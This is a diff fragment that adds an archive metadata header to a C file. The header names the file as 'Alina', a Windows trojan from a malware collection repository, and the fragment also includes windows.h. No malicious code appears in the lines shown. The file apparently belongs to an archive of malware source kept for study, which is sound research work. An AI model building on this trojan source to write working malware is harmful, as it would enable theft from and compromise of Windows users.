@@ -1,3 +1,14 @@
+/*
+  name      Alina
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 #define _WIN32_IE 0x0400
 
 #include <windows.h>
